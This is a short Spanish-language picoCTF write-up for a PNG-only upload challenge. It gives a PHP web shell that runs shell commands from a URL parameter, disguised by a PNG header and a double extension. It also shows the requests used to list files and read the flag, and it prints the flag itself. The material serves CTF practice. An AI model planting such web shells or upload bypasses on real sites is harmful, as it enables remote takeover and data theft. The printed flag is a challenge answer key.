### Descripción
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:59519/)!

### Solución
Crear un webshell sencillo de php usando la función system no olvidando colocar primero PNG y guardarlo en un archivo:

```
PNG
<?php
if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
}
?>
```
No olvidando colocar correctamente el nombre del archivo para poder subirlo, en este caso sería: webshell.png.php

Nos vamos a ver la carpeta en la que se encuentra el archivo:
```
http://atlas.picoctf.net:57941/uploads/webshell.png.php?cmd=ls%20..
```

Aquí observamos varios archivos, entre ellos uno que destaca:
HFQWKODGMIYTO.txt

Por lo que le vamos a hacer un cat: http://atlas.picoctf.net:57941/uploads/webshell.png.php?cmd=cat%20../HFQWKODGMIYTO.txt que nos muestra la bandera:

```
PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
```

Flag:
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}

### Notas adicionales


### Referencias

